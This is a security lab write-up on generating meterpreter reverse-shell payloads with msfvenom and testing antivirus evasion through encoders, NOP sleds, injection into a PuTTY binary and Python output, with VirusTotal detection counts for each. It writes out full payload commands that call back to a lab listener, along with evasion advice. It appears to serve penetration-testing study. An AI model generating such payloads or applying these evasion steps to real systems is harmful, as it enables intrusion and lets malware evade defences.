### Reducing Detection & Exploring Payload Options

##### Continuation of: Gaining Access to a Secured System Payload Delivery 101

**Scenario**

#Payload102

Building on the previous lab, this session moves beyond basic payload generation to explore `msfvenom`'s more advanced options - targeting smaller payload sizes, alternate output formats, and techniques aimed at reducing antivirus detection rates.
Started by reviewing the full option set:

Started by reviewing the full option set:

`msfvenom -h`

<img width="1259" height="551" alt="image" src="https://github.com/user-attachments/assets/2fc465f3-df03-44b2-ba6a-7e30f01f87fe" />

1. **Exploring Output Formats**

msfvenom supports a wide range of output formats beyond `.exe`. Listed them with:

<img width="1445" height="771" alt="image" src="https://github.com/user-attachments/assets/e3f32d22-178e-4cf3-b88f-25ea091aaeb8" />

<img width="1532" height="794" alt="image" src="https://github.com/user-attachments/assets/32d9e3c1-f4ad-4ba8-a9db-c9e5c221084f" />

2. **Baseline Detection Test (VirusTotal)**

To evaluate how different formats and options affect antivirus detection, I used VirusTotal as a benchmark.

Note:

> Once a file is uploaded to VirusTotal, it is shared with antivirus vendors — so this is not a stealth-testing environment for anything beyond lab/educational purposes.

Baseline payload:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=5555 -f exe -o shell1.exe`

**Result: 🔴 42 / 72** security vendors flagged the file as malicious.

<img width="1901" height="885" alt="image" src="https://github.com/user-attachments/assets/aaff3df0-023e-4a24-8c67-f3d15ead9a41" />



3. **Adding Encoding & NOP Sled**

Next, generated a second payload using additional evasion-oriented flags:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=5555 -a x64 -e x64/zutto_dekiru -i 20 --platform windows -n 500 -f exe -o shell2.exe`

**Flag breakdown:**

- `a x64` - target architecture

- `e x64/zutto_dekiru` - encoder used (viewable via msfvenom --list encoders)

- `i 20` - number of encoding iterations

- `--platform windows` - target platform

- `n 500` - NOP sled size (500 no-op instructions padded into the payload)


<img width="1302" height="469" alt="image" src="https://github.com/user-attachments/assets/61da7423-c313-4fdd-89ad-0a6842929e54" />


**Notes on the flags used:**

Iterations (`-i`): More iterations generally reduce detectability, at the cost of a larger payload size. 20 iterations were used here.

NOP sled (`-n`): A NOP is a "do nothing" CPU instruction. Padding the payload with NOPs can help alter its signature footprint.


**Result: 🟡 38 / 72** vendors flagged the file - a reduction of 4 from baseline.

<img width="1827" height="888" alt="image" src="https://github.com/user-attachments/assets/7913b329-348b-48ad-a64d-038a30956487" />


> **Reality check:** `msfvenom`'s built-in encoding options shouldn't be expected to produce dramatic results. It's a widely used, well-documented tool, and antivirus vendors are well-tuned to detect payloads generated with its default options and encoders - regardless of iteration count.


4. **Template Injection**

To further reduce detectability, used the -x (template) flag, which allows msfvenom to inject the payload into an existing legitimate executable. For this test, a Putty binary was used as the template.

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=5555 -x putty.exe -f exe -o shell3.exe`

<img width="1333" height="472" alt="image" src="https://github.com/user-attachments/assets/c5631a79-48bc-44dd-b181-aeee82f52986" />


**Result:** Detection rate held steady at 38 / 72 - no improvement over the encoded payload.

<img width="1316" height="684" alt="image" src="https://github.com/user-attachments/assets/363ca980-f645-4995-9e0e-45286fc88f52" />


5. **Switching Output Format to Python**

Finally, changed the payload format entirely — generating it as a Python file instead of a native Windows executable.


<img width="1138" height="163" alt="image" src="https://github.com/user-attachments/assets/d94bf2f8-266e-40bc-b7b0-a4be626b877c" />


**Result: 🟢 0 / 72** vendors flagged the file as malicious.


<img width="1762" height="860" alt="image" src="https://github.com/user-attachments/assets/e2d44c8a-f0f3-406a-8cae-cdade1ca6705" />


>**Note:** This format is only practical against a target with Python installed - which is the default case on most Linux distributions, but not on Windows. For a Windows target, this approach would require the victim to have Python pre-installed, making it more scenario-dependent than the .exe approach.

**Key Takeaways**

- **Detection is a spectrum, not binary**. Different formats and encoding strategies produce dramatically different results from 42/72 down to 0/72 - using the same underlying payload.

- **`msfvenom`'s native evasion options have limits**. Encoders and iteration counts built into a widely fingerprinted tool will only get you so far against modern AV/EDR.

- **Format matters as much as obfuscation**. Simply changing output format (EXE → Python) had a far bigger detection impact in this test than encoding or templating did.

- **Environment context drives payload choice**. A Python payload is powerful against Linux targets or Python-enabled Windows hosts, but not universally deployable.
